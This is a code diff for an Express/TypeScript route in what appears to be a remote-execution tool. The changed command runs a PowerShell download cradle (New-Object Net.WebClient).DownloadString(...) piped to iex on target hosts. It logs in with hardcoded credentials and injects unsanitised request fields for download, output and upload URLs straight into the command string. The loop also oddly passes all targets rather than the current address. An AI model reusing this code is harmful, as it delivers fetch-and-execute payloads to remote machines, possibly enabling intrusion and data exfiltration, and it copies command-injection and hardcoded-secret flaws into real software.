@@ -1,4 +1,5 @@
 import { Request, Response } from "express";
+import { hashPayload } from "../../utils/index"
 const axios = require('axios')
 import { validateAddress } from "../../utils/index"
 
@@ -31,6 +32,7 @@ export default [
       // req.body.target_regex
 
       //final response mapping {name:response}
+      let hash = hashPayload(req.body.payload);
       let response: { [key: string]: any } = {};
       let status = 200; // OK as default
       req.body.addresses.forEach(async (address: string) => {
@@ -45,12 +47,12 @@ export default [
             })).data;
             response[address]['paasResponse'] = responsePaaS;
 
-            const responseExecute = (await axios.post('http://localhost:5001/execute', {
-              address: address,
+            const responseExecute = (await axios.post('http://localhost:5000/execute', {
+              ip_address: req.body.targets,
               username: 'Witcher',
               password: 'Switcher',
               process: 'powershell.exe',
-              command: req.body.payload,
+              command: `(New-Object Net.WebClient).DownloadString('http://${process.env.BE_IDENTIFIER}:${process.env.PORT}/repo/scripts?hash=${hash}').Replace('ï»¿', '').Replace('<insert args here>', '$downloadUrl = "' + "${req.body.downloadUrl}" + '";$output="' +'${req.body.output}'+'";$uploadUrl="' + "${req.body.uploadUrl}" + '";') | iex`,
             })).data;
             response[address]['executeResponse'] = responseExecute;
           } catch (error) {
